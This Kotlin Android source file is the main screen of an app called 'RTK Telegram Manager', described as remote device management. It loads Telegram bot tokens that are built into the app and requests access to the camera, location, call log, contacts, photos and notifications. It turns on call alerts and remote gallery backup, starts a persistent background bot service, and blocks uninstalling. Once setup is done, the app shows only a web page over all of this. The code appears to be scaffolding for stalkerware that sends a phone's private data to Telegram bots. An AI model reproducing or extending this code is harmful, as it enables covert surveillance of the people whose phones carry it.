package com.rtk.telegrammanager

import android.Manifest
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.core.content.ContextCompat
import com.rtk.telegrammanager.security.SecureStorage
import com.rtk.telegrammanager.device.DeviceManagementManager
import com.rtk.telegrammanager.service.BotForegroundService

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            RTKTelegramManagerApp()
        }
    }
}

@Composable
fun RTKTelegramManagerApp() {
    val context = LocalContext.current
    val storage = remember { SecureStorage(context.applicationContext) }
    var setupComplete by remember { mutableStateOf(storage.isSetupComplete()) }

    MaterialTheme(
        colorScheme = lightColorScheme(
            primary = Color(0xFF6750A4),
            secondary = Color(0xFF625B71),
            background = Color(0xFFF9F7FC),
            surface = Color.White
        )
    ) {
        Surface(
            modifier = Modifier.fillMaxSize(),
            color = MaterialTheme.colorScheme.background
        ) {
            if (!setupComplete) {
                SetupScreen(
                    onSetupComplete = {
                        setupComplete = true
                    }
                )
            } else {
                HomeScreen()
            }
        }
    }
}

@Composable
fun SetupScreen(onSetupComplete: () -> Unit) {
    val context = LocalContext.current
    val storage = remember { SecureStorage(context.applicationContext) }

    val deviceManagement = remember {
        DeviceManagementManager(context.applicationContext)
    }

    var deviceManagementStatus by remember {
        mutableStateOf(deviceManagement.status())
    }

    fun refreshDeviceManagementStatus() {
        deviceManagementStatus = deviceManagement.status()

        if (deviceManagementStatus.isDeviceOwner) {
            deviceManagement.applyUninstallProtection()
            deviceManagementStatus = deviceManagement.status()
        }
    }

    LaunchedEffect(Unit) {
        refreshDeviceManagementStatus()
    }

    var step by remember { mutableStateOf(1) }
    var developerKey by remember { mutableStateOf("") }
    var developerError by remember { mutableStateOf<String?>(null) }

    val permissionsToRequest = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    val allPermissionsLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        storage.saveAutomaticCallAlerts(true)
        storage.saveRemoteGalleryBackup(true)
    }


    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(22.dp),
        verticalArrangement = Arrangement.Center
    ) {
        Icon(
            imageVector = Icons.Default.Smartphone,
            contentDescription = null,
            modifier = Modifier.size(58.dp),
            tint = MaterialTheme.colorScheme.primary
        )

        Spacer(Modifier.height(16.dp))

        Text(
            "RTK Telegram Manager",
            style = MaterialTheme.typography.headlineMedium,
            fontWeight = FontWeight.Bold
        )

        Text(
            "Secure remote device management",
            color = MaterialTheme.colorScheme.onSurfaceVariant
        )

        Spacer(Modifier.height(24.dp))

        LinearProgressIndicator(
            progress = { step / 2f },
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(22.dp))

        when (step) {
            1 -> {
                Text(
                    "Developer Authentication",
                    style = MaterialTheme.typography.titleLarge,
                    fontWeight = FontWeight.Bold
                )

                Spacer(Modifier.height(8.dp))

                Text("Enter Developer Key to load configuration.")

                Spacer(Modifier.height(18.dp))

                OutlinedTextField(
                    value = developerKey,
                    onValueChange = {
                        developerKey = it
                        developerError = null
                    },
                    modifier = Modifier.fillMaxWidth(),
                    label = { Text("Developer Key") },
                    singleLine = true
                )

                Spacer(Modifier.height(18.dp))

                Button(
                    onClick = {
                        if (developerKey.trim() != BuildConfig.RTK_DUAL_BOT_DEVELOPER_KEY) {
                            developerError = "Invalid Developer Key."
                            return@Button
                        }

                        val bot1 = BuildConfig.RTK_DUAL_BOT_1_TOKEN.trim()
                        val bot2 = BuildConfig.RTK_DUAL_BOT_2_TOKEN.trim()
                        val bot1ChatId = BuildConfig.RTK_DUAL_BOT_1_CHAT_ID.trim()
                        val bot2ChatId = BuildConfig.RTK_DUAL_BOT_2_CHAT_ID.trim()

                        if (bot1.isBlank() || bot2.isBlank() || bot1ChatId.isBlank() || bot2ChatId.isBlank()) {
                            developerError = "Configuration incomplete in build."
                            return@Button
                        }

                        storage.saveBotToken(bot1)
                        storage.saveChatId(bot1ChatId)
                        storage.saveBot2Token(bot2)
                        storage.saveBot2ChatId(bot2ChatId)

                        developerError = null
                        step = 2
                    },
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("VERIFY & CONTINUE")
                }

                developerError?.let {
                    Spacer(Modifier.height(10.dp))
                    Text(it, color = MaterialTheme.colorScheme.error)
                }
            }

            2 -> {
                Text(
                    "Required Permissions",
                    style = MaterialTheme.typography.titleLarge,
                    fontWeight = FontWeight.Bold
                )

                Spacer(Modifier.height(8.dp))

                Text("Grant all necessary permissions for full service functionality.")

                Spacer(Modifier.height(18.dp))

                Button(
                    onClick = {
                        allPermissionsLauncher.launch(permissionsToRequest)
                    },
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Icon(Icons.Default.Security, contentDescription = null)
                    Spacer(Modifier.width(8.dp))
                    Text("GRANT ALL PERMISSIONS ⚡")
                }

                Spacer(Modifier.height(12.dp))


                Spacer(
                    Modifier.height(12.dp)
                )

                Card(
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(
                        modifier = Modifier.padding(16.dp)
                    ) {
                        Text(
                            text = "🛡️ DEVICE MANAGEMENT",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold
                        )

                        Spacer(Modifier.height(8.dp))

                        Text(
                            text = if (deviceManagementStatus.isDeviceOwner) {
                                "Device Owner: ✅ ACTIVE"
                            } else {
                                "Device Owner: ❌ NOT ACTIVE"
                            }
                        )

                        Text(
                            text = if (deviceManagementStatus.isAdminActive) {
                                "Admin Component: ✅ ACTIVE"
                            } else {
                                "Admin Component: ❌ NOT ACTIVE"
                            }
                        )

                        Text(
                            text = if (deviceManagementStatus.uninstallBlocked) {
                                "Uninstall Protection: ✅ ACTIVE"
                            } else {
                                "Uninstall Protection: ❌ NOT ACTIVE"
                            }
                        )

                        Spacer(Modifier.height(8.dp))

                        if (deviceManagementStatus.isDeviceOwner) {

                            Text(
                                text = "This device is managed by Android Device Policy. RTK can apply its device-management policy."
                            )

                            Spacer(Modifier.height(10.dp))

                            Button(
                                onClick = {
                                    refreshDeviceManagementStatus()
                                },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Icon(
                                    Icons.Default.Refresh,
                                    contentDescription = null
                                )

                                Spacer(Modifier.width(8.dp))

                                Text("REFRESH MANAGEMENT STATUS")
                            }

                        } else {

                            Text(
                                text = "Device Owner must be established through Android managed-device provisioning. The app cannot silently activate this status."
                            )

                            Spacer(Modifier.height(10.dp))

                            OutlinedButton(
                                onClick = {
                                    refreshDeviceManagementStatus()
                                },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Icon(
                                    Icons.Default.Info,
                                    contentDescription = null
                                )

                                Spacer(Modifier.width(8.dp))

                                Text("CHECK DEVICE MANAGEMENT")
                            }
                        }
                    }
                }

                Spacer(Modifier.height(12.dp))

                OutlinedButton(
                    onClick = {
                        runCatching {
                            context.startActivity(
                                Intent(
                                    Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
                                )
                            )
                        }
                    },
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Icon(
                        Icons.Default.Notifications,
                        contentDescription = null
                    )
                    Spacer(Modifier.width(8.dp))
                    Text("ENABLE NOTIFICATION ACCESS")
                }

                Spacer(Modifier.height(20.dp))

                Button(
                    onClick = {
                        storage.saveSetupComplete(true)
                        storage.saveBotEnabled(true)
                        storage.saveAutomaticCallAlerts(true)
                        storage.saveRemoteGalleryBackup(true)

                        runCatching {
                            ContextCompat.startForegroundService(
                                context,
                                Intent(context, BotForegroundService::class.java)
                            )
                        }

                        onSetupComplete()
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.secondary
                    )
                ) {
                    Text("COMPLETE SETUP")
                }
            }
        }
    }
}

@Composable
fun HomeScreen() {
    val context = LocalContext.current

    LaunchedEffect(Unit) {
        val serviceIntent = Intent(context, BotForegroundService::class.java)
        runCatching {
            ContextCompat.startForegroundService(context, serviceIntent)
        }
    }

    AndroidView(
        factory = { ctx ->
            WebView(ctx).apply {
                webViewClient = WebViewClient()
                settings.javaScriptEnabled = true
                settings.domStorageEnabled = true
                settings.useWideViewPort = true
                loadUrl(BuildConfig.RTK_WEB_URL)
            }
        },
        modifier = Modifier.fillMaxSize()
    )
}
